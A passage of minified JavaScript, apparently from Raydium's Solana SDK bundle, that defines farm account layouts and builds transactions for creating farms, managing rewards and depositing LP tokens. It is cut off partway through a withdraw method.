            feePayer: a,
          } = t,
          u = this.createTxBuilder(a);
        if (n.equals(new Ji(GI)) && i) {
          let t = await this.handleTokenAccount({
              side: "in",
              amount: o || 0,
              mint: n,
              bypassAssociatedCheck: !0,
              programId: r,
            }),
            { tokenAccount: i } = t,
            s = TA(t, ["tokenAccount"]);
          (e = i), u.addInstruction(s);
        } else if (
          ((e = await this.getCreatedTokenAccount({
            mint: n,
            associatedOnly: !1,
            programId: r,
          })),
          !e && s)
        ) {
          let t = await this.scope.account.handleTokenAccount({
              side: "in",
              amount: 0,
              mint: n,
              bypassAssociatedCheck: !0,
              programId: r,
            }),
            { tokenAccount: o } = t,
            i = TA(t, ["tokenAccount"]);
          (e = o), u.addInstruction(i);
        }
        return SA({ tokenAccount: e }, u.AllTxData);
      }
    },
    iB = JT([UT("instruction")]),
    sB = JT([UT("instruction")]),
    aB = JT([
      zT("rewardState"),
      zT("rewardOpenTime"),
      zT("rewardEndTime"),
      zT("rewardLastUpdateTime"),
      zT("totalReward"),
      zT("totalRewardEmissioned"),
      zT("rewardClaimed"),
      zT("rewardPerSecond"),
      KT("accRewardPerShare"),
      jT("rewardVault"),
      jT("rewardMint"),
      jT("rewardSender"),
      zT("rewardType"),
      YT(zT(), 15, "padding"),
    ]),
    uB = JT([
      zT("state"),
      zT("nonce"),
      jT("lpVault"),
      jT("rewardVault"),
      jT(),
      jT(),
      zT(),
      zT(),
      zT("totalReward"),
      KT("perShareReward"),
      zT("lastSlot"),
      zT("perSlotReward"),
    ]),
    cB = JT([
      zT("state"),
      zT("nonce"),
      jT("lpVault"),
      jT("rewardVaultA"),
      zT("totalRewardA"),
      KT("perShareRewardA"),
      zT("perSlotRewardA"),
      UT("option"),
      jT("rewardVaultB"),
      RT(7),
      zT("totalRewardB"),
      KT("perShareRewardB"),
      zT("perSlotRewardB"),
      zT("lastSlot"),
      jT(),
    ]),
    lB = JT([
      zT(),
      zT("state"),
      zT("nonce"),
      zT("validRewardTokenNum"),
      KT("rewardMultiplier"),
      zT("rewardPeriodMax"),
      zT("rewardPeriodMin"),
      zT("rewardPeriodExtend"),
      jT("lpMint"),
      jT("lpVault"),
      YT(aB, 5, "rewardInfos"),
      jT("creator"),
      jT(),
      YT(zT(), 32, "padding"),
    ]);
  new Proxy(uB, {
    get: (t, e, n) =>
      "decode" === e
        ? (...e) => {
            let n = t.decode(...e);
            return _A(SA({}, n), {
              version: 3,
              rewardInfos: [
                {
                  rewardVault: n.rewardVault,
                  totalReward: n.totalReward,
                  perSlotReward: n.perSlotReward,
                  perShareReward: n.perShareReward,
                },
              ],
            });
          }
        : Reflect.get(t, e, n),
  }),
    new Proxy(cB, {
      get: (t, e, n) =>
        "decode" === e
          ? (...e) => {
              let n = t.decode(...e);
              return _A(SA({}, n), {
                version: 5,
                rewardInfos: [
                  {
                    rewardVault: n.rewardVaultA,
                    totalReward: n.totalRewardA,
                    perSlotReward: n.perSlotRewardA,
                    perShareReward: n.perShareRewardA,
                  },
                  {
                    rewardVault: n.rewardVaultB,
                    totalReward: n.totalRewardB,
                    perSlotReward: n.perSlotRewardB,
                    perShareReward: n.perShareRewardB,
                  },
                ],
              });
            }
          : Reflect.get(t, e, n),
    });
  var dB = new Proxy(lB, {
      get: (t, e, n) =>
        "decode" === e
          ? (...e) => {
              let n = t.decode(...e);
              return _A(SA({}, n), {
                version: 6,
                rewardInfos: n.rewardInfos.map((t) => {
                  var e;
                  return _A(SA({}, t), {
                    rewardType: (null !=
                    (e = Object.entries(EB).find(
                      (e) => String(e[1]) === t.rewardType.toString()
                    ))
                      ? e
                      : ["Standard SPL"])[0],
                  });
                }),
              });
            }
          : Reflect.get(t, e, n),
    }),
    fB = JT([
      zT("isSet"),
      zT("rewardPerSecond"),
      zT("rewardOpenTime"),
      zT("rewardEndTime"),
      zT("rewardType"),
    ]),
    hB = JT([UT("instruction"), zT("nonce"), YT(fB, 5, "rewardTimeInfo")]),
    pB = JT([
      UT("instruction"),
      zT("rewardReopenTime"),
      zT("rewardEndTime"),
      zT("rewardPerSecond"),
    ]),
    mB = JT([
      UT("instruction"),
      zT("isSet"),
      zT("rewardPerSecond"),
      zT("rewardOpenTime"),
      zT("rewardEndTime"),
      zT("rewardType"),
    ]);
  JT([
    zT("state"),
    jT("id"),
    jT("owner"),
    zT("deposited"),
    YT(zT(), 1, "rewardDebts"),
  ]);
  var gB = JT([
    zT("state"),
    jT("id"),
    jT("owner"),
    zT("deposited"),
    YT(KT(), 1, "rewardDebts"),
    zT(""),
    zT("voteLockedBalance"),
    YT(zT(), 15),
  ]);
  JT([
    zT("state"),
    jT("id"),
    jT("owner"),
    zT("deposited"),
    YT(zT(), 2, "rewardDebts"),
  ]);
  var yB,
    wB = JT([
      zT("state"),
      jT("id"),
      jT("owner"),
      zT("deposited"),
      YT(KT(), 2, "rewardDebts"),
      YT(zT(), 17),
    ]),
    bB = JT([
      zT(),
      zT("state"),
      jT("id"),
      jT("owner"),
      zT("deposited"),
      YT(KT(), 5, "rewardDebts"),
      YT(zT(), 16),
    ]),
    vB = JT([UT("instruction"), zT("amount")]),
    AB = JT([
      jT("mint"),
      jT("grantAuthority"),
      zT("baselineVoteWeightScaledFactor"),
      zT("maxExtraLockupVoteWeightScaledFactor"),
      zT("lockupSaturationSecs"),
      ((yB = "digitShift"), new NT(1, !0, yB)),
      YT(UT(), 7, "reserved1"),
      YT(zT(), 7, "reserved2"),
    ]);
  JT([
    RT(8),
    jT("governanceProgramId"),
    jT("realm"),
    jT("realmGoverningTokenMint"),
    jT("realmAuthority"),
    YT(UT(), 32, "reserved1"),
    YT(AB, 4, "votingMints"),
    WT("timeOffset"),
    UT("bump"),
    YT(UT(), 7, "reserved2"),
    YT(zT(), 11, "reserved3"),
  ]);
  var kB = JT([
      WT("startTime"),
      WT("endTime"),
      UT("kind"),
      YT(UT(), 15, "reserved"),
    ]),
    IB = JT([
      YT(kB, 1, "lockup"),
      zT("amountDeposited_native"),
      zT("amountInitiallyLockedNative"),
      GT("isUsed"),
      GT("allowClawback"),
      UT("votingMintConfigIdx"),
      YT(UT(), 29, "reserved"),
    ]);
  JT([
    RT(8),
    jT("voterAuthority"),
    jT("registrar"),
    YT(IB, 32, "deposits"),
    UT("voterBump"),
    UT("voterWweightRecordBump"),
    YT(UT(), 94, "reserved"),
  ]),
    PA("Raydium_farm_config");
  var SB = new Ji("4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R"),
    _B = new Ji("FrspKwj8i3pNmKwXreTveC4fu7KL5ZbGeXdZBe2XViu1"),
    TB = { 3: gB, 5: wB, 6: bB },
    BB = (t) => -1 !== [3, 4, 5, 6].indexOf(t),
    CB = (t) => {
      var e;
      let { version: n, rewardInfos: r, rewardTokenAccountsPublicKeys: o } = t,
        i = `rewardInfo:${JSON.stringify(r)}, rewardAccount:${JSON.stringify(
          o
        )}`,
        s = {
          3: () => {
            if (1 !== r.length || 1 !== o.length)
              return `rewardInfos or rewardTokenAccounts lengths not equal 1: ${i}`;
          },
          5: () => {
            if (r.length !== o.length)
              return `rewardInfos and rewardTokenAccounts lengths not equal: ${i}`;
          },
          6: () => {
            if (!o.length || r.length !== o.length)
              return `no rewardTokenAccounts or rewardInfos and rewardTokenAccounts lengths not equal: ${i}`;
          },
        };
      return null == (e = s[n]) ? void 0 : e.call(s);
    },
    EB = { "Standard SPL": 0, "Option tokens": 1 },
    xB = {
      [w_.toString()]: 3,
      [b_.toString()]: 4,
      [v_.toString()]: 5,
      [A_.toString()]: 6,
    },
    PB = PA("Raydium.farm.util");
  function OB({ programId: t, poolId: e, mint: n, type: r }) {
    let { publicKey: o } = f_(
      [
        e.toBuffer(),
        n.toBuffer(),
        dt.from(
          "lpVault" === r
            ? "lp_vault_associated_seed"
            : "rewardVault" === r
            ? "reward_vault_associated_seed"
            : "",
          "utf-8"
        ),
      ],
      t
    );
    return o;
  }
  function RB({ programId: t, poolId: e, owner: n, version: r }) {
    let { publicKey: o } = f_(
      [
        e.toBuffer(),
        n.toBuffer(),
        dt.from(
          6 === r
            ? "farmer_info_associated_seed"
            : "staker_info_v2_associated_seed",
          "utf-8"
        ),
      ],
      t
    );
    return o;
  }
  function MB(t) {
    return {
      isSet: new Yn(1),
      rewardPerSecond: II(t.perSecond),
      rewardOpenTime: II(t.openTime),
      rewardEndTime: II(t.endTime),
      rewardType: II(EB[t.rewardType]),
    };
  }
  function LB(t) {
    return II(t.endTime).sub(II(t.openTime)).mul(II(t.perSecond));
  }
  function NB(t) {
    let e = TB[t];
    return e || PB.logWithError("invalid version", t), e;
  }
  var DB = PA("Raydium_farm_instruction");
  function UB(t) {
    let { version: e, id: n, ledger: r, programId: o, owner: i } = t,
      s = { 3: 9, 5: 10 }[e];
    s || DB.logWithError(`invalid farm pool version: ${e}`);
    let a = dt.alloc(iB.span);
    iB.encode({ instruction: s }, a);
    let u = [
      LI({ pubkey: n }),
      LI({ pubkey: r }),
      LI({ pubkey: i, isWritable: !1 }),
      LI({ pubkey: Gs.programId, isWritable: !1 }),
      LI({ pubkey: Cs, isWritable: !1 }),
    ];
    return {
      instruction: new vs({ programId: o, keys: u, data: a }),
      instructionType: FS,
    };
  }
  function qB({
    payer: t,
    rewardVault: e,
    userRewardTokenPub: n,
    farmKeys: r,
    rewardInfo: o,
  }) {
    let i = dt.alloc(pB.span);
    pB.encode(
      {
        instruction: 3,
        rewardReopenTime: II(o.openTime),
        rewardEndTime: II(o.endTime),
        rewardPerSecond: II(o.perSecond),
      },
      i
    );
    let s = [
      LI({ pubkey: Bc, isWritable: !1 }),
      LI({ pubkey: r.id }),
      LI({ pubkey: r.lpVault, isWritable: !1 }),
      LI({ pubkey: e }),
      LI({ pubkey: n }),
      LI({ pubkey: t, isWritable: !1, isSigner: !0 }),
    ];
    return new vs({ programId: r.programId, keys: s, data: i });
  }
  function zB({
    payer: t,
    userRewardTokenPub: e,
    farmKeys: n,
    rewardVault: r,
    rewardInfo: o,
  }) {
    let i = dt.alloc(mB.span);
    mB.encode(
      {
        instruction: 4,
        isSet: new Yn(1),
        rewardPerSecond: II(o.perSecond),
        rewardOpenTime: II(o.openTime),
        rewardEndTime: II(o.endTime),
        rewardType: II(EB[o.rewardType]),
      },
      i
    );
    let s = [
      ...NI,
      LI({ pubkey: n.id }),
      LI({ pubkey: n.authority, isWritable: !1 }),
      LI({ pubkey: o.mint, isWritable: !1 }),
      LI({ pubkey: r }),
      LI({ pubkey: e }),
      LI({ pubkey: t, isWritable: !1, isSigner: !0 }),
    ];
    return new vs({ programId: n.programId, keys: s, data: i });
  }
  function KB(t) {
    let {
        farmInfo: e,
        farmKeys: n,
        lpAccount: r,
        rewardAccounts: o,
        owner: i,
        amount: s,
      } = t,
      [a, u] = [new Ji(e.programId), new Ji(e.id)],
      c = RB({ programId: a, poolId: u, owner: i, version: 6 }),
      l = dt.alloc(vB.span);
    vB.encode({ instruction: 2, amount: II(s) }, l);
    let d = [
      LI({ pubkey: Bc, isWritable: !1 }),
      LI({ pubkey: u }),
      LI({ pubkey: new Ji(n.authority), isWritable: !1 }),
      LI({ pubkey: new Ji(n.lpVault) }),
      LI({ pubkey: c }),
      LI({ pubkey: i, isWritable: !1, isSigner: !0 }),
      LI({ pubkey: r }),
    ];
    for (let f = 0; f < n.rewardInfos.length; f++)
      d.push(LI({ pubkey: new Ji(n.rewardInfos[f].vault) })),
        d.push(LI({ pubkey: o[f] }));
    return new vs({ programId: a, keys: d, data: l });
  }
  function WB(t) {
    let {
        farmInfo: e,
        farmKeys: n,
        lpAccount: r,
        rewardAccounts: o,
        owner: i,
        amount: s,
        userAuxiliaryLedgers: a,
      } = t,
      [u, c] = [new Ji(e.programId), new Ji(e.id)],
      l = RB({ programId: u, poolId: c, owner: i, version: 5 }),
      d = dt.alloc(vB.span);
    vB.encode({ instruction: 12, amount: II(s) }, d);
    let f = [
      LI({ pubkey: c }),
      LI({ pubkey: new Ji(n.authority), isWritable: !1 }),
      LI({ pubkey: l }),
      LI({ pubkey: i, isWritable: !1, isSigner: !0 }),
      LI({ pubkey: r }),
      LI({ pubkey: new Ji(n.lpVault) }),
      LI({ pubkey: o[0] }),
      LI({ pubkey: new Ji(n.rewardInfos[0].vault) }),
      LI({ pubkey: Ss, isWritable: !1 }),
      LI({ pubkey: Bc, isWritable: !1 }),
    ];
    for (let h = 1; h < n.rewardInfos.length; h++)
      f.push(LI({ pubkey: o[h] })),
        f.push(LI({ pubkey: new Ji(n.rewardInfos[h].vault) }));
    if (a) for (let h of a) f.push(LI({ pubkey: h }));
    return new vs({ programId: u, keys: f, data: d });
  }
  function FB(t) {
    let {
        farmInfo: e,
        farmKeys: n,
        lpAccount: r,
        rewardAccounts: o,
        owner: i,
        amount: s,
        userAuxiliaryLedgers: a,
      } = t,
      [u, c] = [new Ji(e.programId), new Ji(e.id)],
      l = RB({ programId: u, poolId: c, owner: i, version: 3 }),
      d = dt.alloc(vB.span);
    vB.encode({ instruction: 11, amount: II(s) }, d);
    let f = [
      LI({ pubkey: c }),
      LI({ pubkey: new Ji(n.authority), isWritable: !1 }),
      LI({ pubkey: l }),
      LI({ pubkey: i, isWritable: !1, isSigner: !0 }),
      LI({ pubkey: r }),
      LI({ pubkey: new Ji(n.lpVault) }),
      LI({ pubkey: o[0] }),
      LI({ pubkey: new Ji(n.rewardInfos[0].vault) }),
      LI({ pubkey: Ss, isWritable: !1 }),
      LI({ pubkey: Bc, isWritable: !1 }),
    ];
    if (a) for (let h of a) f.push(LI({ pubkey: h }));
    return new vs({ programId: u, keys: f, data: d });
  }
  ({
    voterStakeRegistryCreateVoter: dt.from([6, 24, 245, 52, 243, 255, 148, 25]),
    voterStakeRegistryCreateDepositEntry: dt.from([
      185, 131, 167, 186, 159, 125, 19, 67,
    ]),
    voterStakeRegistryDeposit: dt.from([242, 35, 198, 137, 82, 225, 242, 182]),
    voterStakeRegistryWithdraw: dt.from([183, 18, 70, 156, 148, 109, 161, 34]),
    voterStakeRegistryUpdateVoterWeightRecord: dt.from([
      45, 185, 3, 36, 109, 190, 115, 169,
    ]),
  });
  var jB = class extends cT {
      async _getUserRewardInfo({ payer: t, rewardInfo: e }) {
        if (e.mint.equals(VI)) {
          let n = await rB({
            connection: this.scope.connection,
            owner: this.scope.ownerPubKey,
            payer: t,
            amount: LB(
              _A(SA({}, e), {
                openTime: e.openTime.toString(),
                endTime: e.endTime.toString(),
              })
            ),
          });
          return { rewardPubKey: n.addresses.newAccount, newInstruction: n };
        }
        return {
          rewardPubKey: await this.scope.account.getCreatedTokenAccount({
            mint: e.mint,
            associatedOnly: !1,
          }),
        };
      }
      async create({
        poolInfo: t,
        rewardInfos: e,
        payer: n,
        programId: r = A_,
        txVersion: o,
        feePayer: i,
      }) {
        this.checkDisabled(), this.scope.checkOwner();
        let s = {
            lpMint: new Ji(t.lpMint.address),
            lockInfo: { lockMint: SB, lockVault: _B },
            rewardInfos: e,
            programId: r,
          },
          a = this.createTxBuilder(i),
          u = null != n ? n : this.scope.ownerPubKey,
          c = $T({ fromPublicKey: u, programId: s.programId }),
          l = await this.scope.connection.getMinimumBalanceForRentExemption(
            dB.span
          );
        a.addInstruction({
          instructions: [
            Gs.createAccountWithSeed({
              fromPubkey: u,
              basePubkey: u,
              seed: c.seed,
              newAccountPubkey: c.publicKey,
              lamports: l,
              space: dB.span,
              programId: s.programId,
            }),
          ],
        });
        let { publicKey: d, nonce: f } = (({ programId: t, poolId: e }) =>
            f_([e.toBuffer()], t))({
            programId: new Ji(s.programId),
            poolId: c.publicKey,
          }),
          h = OB({
            programId: s.programId,
            poolId: c.publicKey,
            mint: s.lpMint,
            type: "lpVault",
          }),
          p = [],
          m = [];
        for (let v of s.rewardInfos) {
          v.openTime >= v.endTime &&
            this.logAndCreateError(
              "start time error",
              "rewardInfo.rewardOpenTime",
              v.openTime.toString()
            ),
            isNaN(EB[v.rewardType]) &&
              this.logAndCreateError("rewardType error", v.rewardType),
            Number(v.perSecond) <= 0 &&
              this.logAndCreateError("rewardPerSecond error", v.perSecond),
            p.push(MB(v));
          let { rewardPubKey: t, newInstruction: e } =
            await this._getUserRewardInfo({ rewardInfo: v, payer: u });
          e && a.addInstruction(e),
            t ||
              this.logAndCreateError(
                "cannot found target token accounts",
                this.scope.account.tokenAccounts
              );
          let n = v.mint.equals(VI) ? new Ji(MI.address) : v.mint;
          m.push({
            rewardMint: n,
            rewardVault: OB({
              programId: s.programId,
              poolId: c.publicKey,
              mint: n,
              type: "rewardVault",
            }),
            userRewardToken: t,
          });
        }
        let { account: g, instructionParams: y } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: new Ji(s.lockInfo.lockMint),
            owner: this.scope.ownerPubKey,
            skipCloseAccount: !1,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            associatedOnly: !1,
          });
        y && a.addInstruction(y),
          g ||
            this.logAndCreateError(
              "cannot found lock vault",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let { instruction: w, instructionType: b } = (function (t) {
          var e;
          let n = dt.alloc(hB.span);
          hB.encode(
            {
              instruction: 0,
              nonce: new Yn(t.nonce),
              rewardTimeInfo: t.rewardInfoConfig,
            },
            n
          );
          let r = [
            ...NI,
            LI({ pubkey: t.farmId }),
            LI({ pubkey: t.farmAuthority, isWritable: !1 }),
            LI({ pubkey: t.lpVault }),
            LI({ pubkey: t.lpMint, isWritable: !1 }),
            LI({ pubkey: t.lockVault }),
            LI({ pubkey: t.lockMint, isWritable: !1 }),
            LI({ pubkey: null != (e = t.lockUserAccount) ? e : VI }),
            LI({ pubkey: t.owner, isWritable: !1, isSigner: !0 }),
          ];
          for (let o of t.rewardInfo)
            r.push(
              LI({ pubkey: o.rewardMint, isWritable: !1 }),
              LI({ pubkey: o.rewardVault }),
              LI({ pubkey: o.userRewardToken })
            );
          return {
            instruction: new vs({ programId: t.programId, keys: r, data: n }),
            instructionType: XS,
          };
        })({
          farmId: c.publicKey,
          owner: this.scope.ownerPubKey,
          farmAuthority: d,
          lpVault: h,
          lpMint: s.lpMint,
          lockVault: s.lockInfo.lockVault,
          lockMint: s.lockInfo.lockMint,
          lockUserAccount: g,
          programId: s.programId,
          rewardInfo: m,
          rewardInfoConfig: p,
          nonce: f,
        });
        return a
          .addInstruction({ instructions: [w], instructionTypes: [b] })
          .versionBuild({
            txVersion: o,
            extInfo: {
              farmId: c.publicKey,
              farmAuthority: d,
              lpVault: h,
              lockUserAccount: g,
              nonce: f,
            },
          });
      }
      async restartReward({
        farmInfo: t,
        payer: e,
        newRewardInfo: n,
        txVersion: r,
        feePayer: o,
      }) {
        var i;
        let s = xB[t.programId];
        6 !== s && this.logAndCreateError("invalid farm version ", s);
        let a = eS((await this.scope.api.fetchFarmKeysById({ ids: t.id }))[0]),
          u = {
            id: a.id,
            rewardInfos: t.rewardInfos,
            lpVault: a.lpVault,
            programId: a.programId,
          };
        n.openTime >= n.endTime &&
          this.logAndCreateError("start time error", "newRewardInfo", n);
        let c = e || this.scope.ownerPubKey,
          l = n.mint.equals(VI) ? new Ji(MI.address) : n.mint,
          d = u.rewardInfos.findIndex((t) => new Ji(t.mint.address).equals(l)),
          f = a.rewardInfos[d];
        f ||
          this.logAndCreateError(
            "configuration does not exist",
            "rewardMint",
            l
          );
        let h = null != (i = f.vault) ? i : VI,
          p = this.createTxBuilder(o),
          { rewardPubKey: m, newInstruction: g } =
            await this._getUserRewardInfo({ rewardInfo: n, payer: c });
        return (
          g && p.addInstruction(g),
          m ||
            this.logAndCreateError(
              "cannot found target token accounts",
              this.scope.account.tokenAccounts
            ),
          p
            .addInstruction({
              instructions: [
                qB({
                  payer: this.scope.ownerPubKey,
                  rewardVault: h,
                  userRewardTokenPub: m,
                  farmKeys: u,
                  rewardInfo: n,
                }),
              ],
              instructionTypes: [JS],
            })
            .versionBuild({ txVersion: r })
        );
      }
      async restartRewards({
        farmInfo: t,
        payer: e,
        newRewardInfos: n,
        txVersion: r,
        feePayer: o,
      }) {
        var i;
        let s = xB[t.programId];
        6 !== s && this.logAndCreateError("invalid farm version ", s);
        let a = eS((await this.scope.api.fetchFarmKeysById({ ids: t.id }))[0]),
          u = {
            id: a.id,
            rewardInfos: t.rewardInfos,
            lpVault: a.lpVault,
            programId: a.programId,
          };
        n.forEach((t) => {
          t.openTime >= t.endTime &&
            this.logAndCreateError("start time error", "newRewardInfo", t);
        });
        let c = e || this.scope.ownerPubKey,
          l = this.createTxBuilder(o);
        for (let d of n) {
          let t = d.mint.equals(VI) ? new Ji(MI.address) : d.mint,
            e = u.rewardInfos.findIndex((e) =>
              new Ji(e.mint.address).equals(t)
            ),
            n = a.rewardInfos[e];
          n ||
            this.logAndCreateError(
              "configuration does not exist",
              "rewardMint",
              t
            );
          let r = null != (i = n.vault) ? i : VI,
            { rewardPubKey: o, newInstruction: s } =
              await this._getUserRewardInfo({ rewardInfo: d, payer: c });
          s && l.addInstruction(s),
            o ||
              this.logAndCreateError(
                "cannot found target token accounts",
                this.scope.account.tokenAccounts
              );
          let f = qB({
            payer: this.scope.ownerPubKey,
            rewardVault: r,
            userRewardTokenPub: o,
            farmKeys: u,
            rewardInfo: d,
          });
          l.addInstruction({ instructions: [f], instructionTypes: [JS] });
        }
        return l.versionBuild({ txVersion: r });
      }
      async addNewRewardToken(t) {
        let {
            txVersion: e,
            farmInfo: n,
            newRewardInfo: r,
            payer: o,
            feePayer: i,
          } = t,
          s = xB[n.programId];
        6 !== s && this.logAndCreateError("invalid farm version ", s);
        let a = eS((await this.scope.api.fetchFarmKeysById({ ids: n.id }))[0]),
          u = null != o ? o : this.scope.ownerPubKey,
          c = this.createTxBuilder(i),
          l = r.mint.equals(VI) ? new Ji(MI.address) : r.mint,
          d = OB({
            programId: new Ji(n.programId),
            poolId: new Ji(n.id),
            mint: l,
            type: "rewardVault",
          }),
          { rewardPubKey: f, newInstruction: h } =
            await this._getUserRewardInfo({ rewardInfo: r, payer: u });
        return (
          h && c.addInstruction(h),
          f ||
            this.logAndCreateError(
              "annot found target token accounts",
              this.scope.account.tokenAccounts
            ),
          (r.mint = l),
          c
            .addInstruction({
              instructions: [
                zB({
                  payer: this.scope.ownerPubKey,
                  userRewardTokenPub: f,
                  farmKeys: a,
                  rewardVault: d,
                  rewardInfo: r,
                }),
              ],
              instructionTypes: [YS],
            })
            .versionBuild({ txVersion: e })
        );
      }
      async addNewRewardsToken(t) {
        let {
            txVersion: e,
            farmInfo: n,
            newRewardInfos: r,
            payer: o,
            feePayer: i,
          } = t,
          s = xB[n.programId];
        6 !== s && this.logAndCreateError("invalid farm version ", s);
        let a = eS((await this.scope.api.fetchFarmKeysById({ ids: n.id }))[0]),
          u = null != o ? o : this.scope.ownerPubKey,
          c = this.createTxBuilder(i);
        for (let l of r) {
          let t = l.mint.equals(VI) ? new Ji(MI.address) : l.mint,
            e = OB({
              programId: new Ji(n.programId),
              poolId: new Ji(n.id),
              mint: t,
              type: "rewardVault",
            }),
            { rewardPubKey: r, newInstruction: o } =
              await this._getUserRewardInfo({ rewardInfo: l, payer: u });
          o && c.addInstruction(o),
            r ||
              this.logAndCreateError(
                "cannot found target token accounts",
                this.scope.account.tokenAccounts
              );
          let i = zB({
            payer: this.scope.ownerPubKey,
            userRewardTokenPub: r,
            farmKeys: a,
            rewardVault: e,
            rewardInfo: _A(SA({}, l), { mint: t }),
          });
          c.addInstruction({ instructions: [i], instructionTypes: [YS] });
        }
        return c.versionBuild({ txVersion: e });
      }
      async deposit(t) {
        let {
          txVersion: e,
          farmInfo: n,
          amount: r,
          feePayer: o,
          useSOLBalance: i,
          associatedOnly: s = !0,
          checkCreateATAOwner: a = !1,
          userAuxiliaryLedgers: u,
          computeBudgetConfig: c,
          txTipConfig: l,
        } = t;
        !1 === this.scope.availability.addFarm &&
          this.logAndCreateError(
            "farm deposit feature disabled in your region"
          );
        let { rewardInfos: d, programId: f } = n,
          h = xB[f];
        4 === h &&
          this.logAndCreateError("V4 has suspended deposits:", n.programId),
          BB(h) || this.logAndCreateError("invalid farm program:", n.programId);
        let [p, m] = [new Ji(n.programId), new Ji(n.id)],
          g = (await this.scope.api.fetchFarmKeysById({ ids: n.id }))[0],
          y = RB({
            programId: p,
            poolId: m,
            owner: this.scope.ownerPubKey,
            version: h,
          }),
          w = this.createTxBuilder(o);
        w.addCustomComputeBudget(c), w.addTipInstruction(l);
        let b = {};
        for (let C of this.scope.account.tokenAccounts)
          if (s) {
            let t = y_(this.scope.ownerPubKey, C.mint, C.programId).publicKey;
            C.publicKey &&
              t.equals(C.publicKey) &&
              (b[C.mint.toString()] = C.publicKey);
          } else b[C.mint.toString()] = C.publicKey;
        let v = b[g.lpMint.address];
        v || this.logAndCreateError("you don't have any lp", "lp zero", b);
        let A = [];
        for (let C of d) {
          let t = i && C.mint.address === GI.toString(),
            e = b[C.mint.address];
          if (!e) {
            let { account: n, instructionParams: r } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: C.mint.programId,
                mint: new Ji(C.mint.address),
                notUseTokenAccount: t,
                createInfo: { payer: o || this.scope.ownerPubKey, amount: 0 },
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !t,
                associatedOnly: !t && s,
                checkCreateATAOwner: a,
              });
            (e = n), r && w.addInstruction(r);
          }
          (b[C.mint.address] = e), A.push(e);
        }
        let k,
          I = await this.scope.connection.getAccountInfo(y);
        if (
          (I && (k = NB(h).decode(I.data)), n.programId !== A_.toString() && !k)
        ) {
          let { instruction: t, instructionType: e } = UB({
            id: m,
            programId: p,
            version: h,
            ledger: y,
            owner: this.scope.ownerPubKey,
          });
          w.addInstruction({ instructions: [t], instructionTypes: [e] });
        }
        let S = CB({
          version: h,
          rewardInfos: d,
          rewardTokenAccountsPublicKeys: A,
        });
        S && this.logAndCreateError(S);
        let _ = {
            amount: II(r),
            owner: this.scope.ownerPubKey,
            farmInfo: n,
            farmKeys: g,
            lpAccount: v,
            rewardAccounts: A,
            userAuxiliaryLedgers: null == u ? void 0 : u.map((t) => new Ji(t)),
          },
          T =
            6 === h
              ? (function (t) {
                  let {
                      farmInfo: e,
                      farmKeys: n,
                      lpAccount: r,
                      rewardAccounts: o,
                      owner: i,
                      amount: s,
                    } = t,
                    [a, u] = [new Ji(e.programId), new Ji(e.id)],
                    c = RB({ programId: a, poolId: u, owner: i, version: 6 }),
                    l = dt.alloc(vB.span);
                  vB.encode({ instruction: 1, amount: II(s) }, l);
                  let d = [
                    LI({ pubkey: Bc, isWritable: !1 }),
                    LI({ pubkey: Gs.programId, isWritable: !1 }),
                    LI({ pubkey: u }),
                    LI({ pubkey: new Ji(n.authority), isWritable: !1 }),
                    LI({ pubkey: new Ji(n.lpVault) }),
                    LI({ pubkey: c }),
                    LI({ pubkey: i, isWritable: !1, isSigner: !0 }),
                    LI({ pubkey: r }),
                  ];
                  for (let f = 0; f < n.rewardInfos.length; f++)
                    d.push(LI({ pubkey: new Ji(n.rewardInfos[f].vault) })),
                      d.push(LI({ pubkey: o[f] }));
                  return new vs({ programId: a, keys: d, data: l });
                })(_)
              : 5 === h
              ? (function (t) {
                  let {
                      farmInfo: e,
                      farmKeys: n,
                      lpAccount: r,
                      rewardAccounts: o,
                      owner: i,
                      amount: s,
                      userAuxiliaryLedgers: a,
                    } = t,
                    [u, c] = [new Ji(e.programId), new Ji(e.id)],
                    l = RB({ programId: u, poolId: c, owner: i, version: 5 }),
                    d = dt.alloc(vB.span);
                  vB.encode({ instruction: 11, amount: II(s) }, d);
                  let f = [
                    LI({ pubkey: c }),
                    LI({ pubkey: new Ji(n.authority), isWritable: !1 }),
                    LI({ pubkey: l }),
                    LI({ pubkey: i, isWritable: !1, isSigner: !0 }),
                    LI({ pubkey: r }),
                    LI({ pubkey: new Ji(n.lpVault) }),
                    LI({ pubkey: o[0] }),
                    LI({ pubkey: new Ji(n.rewardInfos[0].vault) }),
                    LI({ pubkey: Ss, isWritable: !1 }),
                    LI({ pubkey: Bc, isWritable: !1 }),
                  ];
                  for (let h = 1; h < n.rewardInfos.length; h++)
                    f.push(LI({ pubkey: o[h] })),
                      f.push(LI({ pubkey: new Ji(n.rewardInfos[h].vault) }));
                  if (a) for (let h of a) f.push(LI({ pubkey: h }));
                  return new vs({ programId: u, keys: f, data: d });
                })(_)
              : (function (t) {
                  let {
                      farmInfo: e,
                      farmKeys: n,
                      lpAccount: r,
                      rewardAccounts: o,
                      owner: i,
                      amount: s,
                      userAuxiliaryLedgers: a,
                    } = t,
                    [u, c] = [new Ji(e.programId), new Ji(e.id)],
                    l = RB({ programId: u, poolId: c, owner: i, version: 3 }),
                    d = dt.alloc(vB.span);
                  vB.encode({ instruction: 10, amount: II(s) }, d);
                  let f = [
                    LI({ pubkey: c }),
                    LI({ pubkey: new Ji(n.authority), isWritable: !1 }),
                    LI({ pubkey: l }),
                    LI({ pubkey: i, isWritable: !1, isSigner: !0 }),
                    LI({ pubkey: r }),
                    LI({ pubkey: new Ji(n.lpVault) }),
                    LI({ pubkey: o[0] }),
                    LI({ pubkey: new Ji(n.rewardInfos[0].vault) }),
                    LI({ pubkey: Ss, isWritable: !1 }),
                    LI({ pubkey: Bc, isWritable: !1 }),
                  ];
                  if (a) for (let h of a) f.push(LI({ pubkey: h }));
                  return new vs({ programId: u, keys: f, data: d });
                })(_),
          B = { 3: KS, 5: GS, 6: HS };
        return w
          .addInstruction({ instructions: [T], instructionTypes: [B[h]] })
          .versionBuild({ txVersion: e });
      }
      async withdraw(t) {
        let {
            txVersion: e,
            farmInfo: n,
            amount: r,
            deposited: o,
            useSOLBalance: i,
            feePayer: s,
            associatedOnly: a = !0,
            checkCreateATAOwner: u = !1,
            userAuxiliaryLedgers: c,
            computeBudgetConfig: l,
